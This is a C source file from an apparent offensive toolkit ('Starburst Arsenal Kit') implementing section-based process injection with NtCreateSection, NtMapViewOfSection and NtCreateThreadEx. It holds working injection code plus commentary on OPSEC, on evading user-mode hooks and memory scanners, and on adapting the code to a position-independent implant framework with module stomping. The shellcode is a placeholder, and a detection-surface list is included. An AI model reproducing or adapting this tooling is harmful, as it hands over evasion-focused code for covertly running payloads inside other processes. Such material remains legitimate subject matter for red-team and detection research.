/*
 * inject_section.c - NtCreateSection + NtMapViewOfSection Injection
 *
 * Starburst Arsenal Kit - Injection Techniques
 * =============================================
 *
 * TECHNIQUE: Section-based injection via NT API
 *
 * This technique uses section objects (shared memory) to inject
 * shellcode into a target process. Instead of VirtualAllocEx +
 * WriteProcessMemory, a section object is created and mapped into
 * both the local and remote process. The shellcode is written to
 * the local mapping, then the local mapping is unmapped, leaving
 * the shellcode in the remote process's address space.
 *
 * FLOW:
 *   1. NtCreateSection - create section object (backed by pagefile)
 *   2. NtMapViewOfSection (local, RW) - map into current process
 *   3. memcpy - write shellcode to local view
 *   4. NtUnmapViewOfSection (local) - unmap from current process
 *   5. NtMapViewOfSection (remote, RX) - map into target process
 *   6. NtCreateThreadEx / CreateRemoteThread - execute in target
 *
 * OPSEC RATING: MEDIUM-HIGH
 *
 *   Avoids VirtualAllocEx and WriteProcessMemory entirely. The
 *   memory in the target process is section-backed (not private),
 *   which is harder to distinguish from legitimate shared memory.
 *   However, the section is backed by the pagefile (not a file on
 *   disk), which some scanners can detect.
 *
 * DETECTION SURFACE:
 *   - ETW: Microsoft-Windows-Threat-Intelligence
 *       * EtwTiMapViewOfSection (section mapping into remote process)
 *   - Kernel callbacks:
 *       * PsSetCreateThreadNotifyRoutineEx (if using thread creation)
 *       * ObRegisterCallbacks (handle access)
 *   - User-mode hooks:
 *       * NtCreateSection - section creation
 *       * NtMapViewOfSection - section mapping
 *       * NtCreateThreadEx - thread creation
 *   - Behavioral:
 *       * Pagefile-backed section mapped into remote process
 *       * Section with EXECUTE permissions in remote process
 *       * Thread start address in section-backed memory
 *         (less suspicious than private memory, but still anomalous
 *          if the section is not backed by a known DLL)
 *
 * MONITORED API CALLS:
 *   NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection,
 *   NtCreateThreadEx (or CreateRemoteThread), OpenProcess
 *
 * PROS:
 *   - No VirtualAllocEx (avoids remote allocation detection)
 *   - No WriteProcessMemory (avoids cross-process write detection)
 *   - Memory is section-backed, not private (harder to detect via VAD)
 *   - Shellcode write happens locally (no cross-process write)
 *   - Section objects are a legitimate IPC mechanism
 *
 * CONS:
 *   - Still requires OpenProcess with VM rights
 *   - Still requires thread creation for execution
 *   - Pagefile-backed sections are less common than file-backed
 *   - NT API usage from user-mode is itself a signal
 *   - Section-backed executable memory from pagefile is anomalous
 *
 * ADAPTING FOR STARBURST PIC (Stardust framework):
 *   - All NT API calls here map to Stardust syscall wrappers
 *   - Replace GetProcAddress resolution with Stardust LdrFunction
 *   - memcpy can be replaced with Stardust's MemCopy
 *   - Consider using NtCreateThreadEx exclusively (already resolved)
 *   - For enhanced OPSEC, combine with module stomping: map the
 *     section over a legitimate DLL's .text section
 *
 * COMPILE:
 *   cl.exe /W4 /O2 inject_section.c /Fe:inject_section.exe
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "../include/injection.h"

/*
 * inject - Perform section-based injection into a target process.
 *
 * Parameters:
 *   pid           - Target process ID
 *   shellcode     - Pointer to shellcode buffer
 *   shellcode_len - Size of shellcode in bytes
 *
 * Returns:
 *   TRUE on success, FALSE on failure.
 */
BOOL inject(DWORD pid, LPVOID shellcode, SIZE_T shellcode_len) {
    HANDLE   hProcess       = NULL;
    HANDLE   hSection       = NULL;
    HANDLE   hThread        = NULL;
    PVOID    localBaseAddr   = NULL;
    PVOID    remoteBaseAddr  = NULL;
    SIZE_T   viewSize        = 0;
    NTSTATUS status;
    BOOL     result          = FALSE;

    /* --------------------------------------------------------
     * Resolve NT API functions from ntdll.dll
     *
     * These functions are not exported by kernel32.dll and must
     * be resolved at runtime from ntdll.dll.
     * -------------------------------------------------------- */
    fnNtCreateSection       pNtCreateSection;
    fnNtMapViewOfSection    pNtMapViewOfSection;
    fnNtUnmapViewOfSection  pNtUnmapViewOfSection;
    fnNtCreateThreadEx      pNtCreateThreadEx;
    fnNtClose               pNtClose;

    pNtCreateSection = (fnNtCreateSection)
        ResolveNtFunction("NtCreateSection");
    pNtMapViewOfSection = (fnNtMapViewOfSection)
        ResolveNtFunction("NtMapViewOfSection");
    pNtUnmapViewOfSection = (fnNtUnmapViewOfSection)
        ResolveNtFunction("NtUnmapViewOfSection");
    pNtCreateThreadEx = (fnNtCreateThreadEx)
        ResolveNtFunction("NtCreateThreadEx");
    pNtClose = (fnNtClose)
        ResolveNtFunction("NtClose");

    if (!pNtCreateSection || !pNtMapViewOfSection ||
        !pNtUnmapViewOfSection || !pNtCreateThreadEx || !pNtClose) {
        fprintf(stderr, "[!] Failed to resolve one or more NT functions\n");
        goto cleanup;
    }
    fprintf(stderr, "[+] NT functions resolved from ntdll.dll\n");

    /* --------------------------------------------------------
     * Step 1: Open target process
     *
     * We do NOT need PROCESS_VM_WRITE or PROCESS_VM_OPERATION
     * for allocation/write because we use section mapping instead.
     * We still need these for NtMapViewOfSection into the remote
     * process, but the intent is different from VirtualAllocEx.
     * -------------------------------------------------------- */
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid
    );
    if (!hProcess) {
        fprintf(stderr, "[!] OpenProcess failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Opened process %lu\n", pid);

    /* --------------------------------------------------------
     * Step 2: Create a section object
     *
     * The section is backed by the pagefile (FileHandle = NULL).
     * We request SECTION_ALL_ACCESS and PAGE_EXECUTE_READWRITE
     * so we can map it with different permissions on each side.
     *
     * Size must accommodate the shellcode.
     * -------------------------------------------------------- */
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = (LONGLONG)shellcode_len;

    status = pNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,                       /* no object attributes */
        &sectionSize,
        PAGE_EXECUTE_READWRITE,     /* maximum protection */
        SEC_COMMIT,                 /* committed pages */
        NULL                        /* pagefile-backed */
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtCreateSection failed: 0x%08lX\n",
                (unsigned long)status);
        goto cleanup;
    }
    fprintf(stderr, "[+] Section created (size: %zu bytes)\n", shellcode_len);

    /* --------------------------------------------------------
     * Step 3: Map section into LOCAL process with RW access
     *
     * This gives us a writable view of the section's memory.
     * We write the shellcode here without any cross-process
     * write API calls.
     * -------------------------------------------------------- */
    viewSize = shellcode_len;
    status = pNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),        /* local process */
        &localBaseAddr,
        0,                          /* zero bits */
        shellcode_len,              /* commit size */
        NULL,                       /* section offset */
        &viewSize,
        ViewUnmap,                  /* inherit disposition */
        0,                          /* allocation type */
        PAGE_READWRITE              /* RW for writing */
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtMapViewOfSection (local) failed: 0x%08lX\n",
                (unsigned long)status);
        goto cleanup;
    }
    fprintf(stderr, "[+] Mapped local view at 0x%p (RW)\n", localBaseAddr);

    /* --------------------------------------------------------
     * Step 4: Write shellcode to the local mapping
     *
     * This is a local memcpy - no cross-process write involved.
     * The write goes through the section object, so it is
     * automatically visible in any other mapping of this section.
     * -------------------------------------------------------- */
    memcpy(localBaseAddr, shellcode, shellcode_len);
    fprintf(stderr, "[+] Shellcode written to local view (%zu bytes)\n",
            shellcode_len);

    /* --------------------------------------------------------
     * Step 5: Unmap the local view
     *
     * We no longer need the local mapping. The section object
     * retains the data.
     * -------------------------------------------------------- */
    status = pNtUnmapViewOfSection(GetCurrentProcess(), localBaseAddr);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtUnmapViewOfSection (local) failed: 0x%08lX\n",
                (unsigned long)status);
        /* Non-fatal - continue */
    } else {
        fprintf(stderr, "[+] Unmapped local view\n");
    }
    localBaseAddr = NULL;

    /* --------------------------------------------------------
     * Step 6: Map section into REMOTE process with RX access
     *
     * The remote process gets a read-execute view. The shellcode
     * is already present in the section from our local write.
     *
     * This mapping appears as section-backed memory in the VAD
     * tree, not as private memory, making it harder to detect
     * via memory scanning tools that flag private executable
     * memory.
     * -------------------------------------------------------- */
    viewSize = shellcode_len;
    status = pNtMapViewOfSection(
        hSection,
        hProcess,                   /* remote process */
        &remoteBaseAddr,
        0,                          /* zero bits */
        shellcode_len,              /* commit size */
        NULL,                       /* section offset */
        &viewSize,
        ViewUnmap,                  /* inherit disposition */
        0,                          /* allocation type */
        PAGE_EXECUTE_READ           /* RX for execution */
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtMapViewOfSection (remote) failed: 0x%08lX\n",
                (unsigned long)status);
        goto cleanup;
    }
    fprintf(stderr, "[+] Mapped remote view at 0x%p (RX)\n", remoteBaseAddr);

    /* --------------------------------------------------------
     * Step 7: Create a thread in the remote process to execute
     *
     * Using NtCreateThreadEx instead of CreateRemoteThread to
     * stay at the NT layer and avoid kernel32 hooks.
     * -------------------------------------------------------- */
    status = pNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,                       /* object attributes */
        hProcess,
        remoteBaseAddr,             /* start routine */
        NULL,                       /* argument */
        0,                          /* create flags (run immediately) */
        0,                          /* zero bits */
        0,                          /* stack size */
        0,                          /* max stack size */
        NULL                        /* attribute list */
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtCreateThreadEx failed: 0x%08lX\n",
                (unsigned long)status);
        goto cleanup;
    }
    fprintf(stderr, "[+] Remote thread created\n");

    /* Wait for thread completion */
    WaitForSingleObject(hThread, INFINITE);
    fprintf(stderr, "[+] Remote thread completed\n");

    result = TRUE;

cleanup:
    if (hThread)  CloseHandle(hThread);
    if (hSection) pNtClose(hSection);
    if (hProcess) CloseHandle(hProcess);

    /*
     * Note: The remote mapping is left in place intentionally.
     * The section handle is closed, but the mapping persists
     * in the remote process until it unmaps it or exits.
     */

    return result;
}

#ifdef BUILD_STANDALONE
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);

    /* Placeholder shellcode */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,
        0xCC
    };

    printf("[*] Section-based injection\n");
    printf("[*] Target PID: %lu\n", pid);
    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));

    if (inject(pid, shellcode, sizeof(shellcode))) {
        printf("[+] Injection succeeded\n");
        return 0;
    } else {
        printf("[-] Injection failed\n");
        return 1;
    }
}
#endif
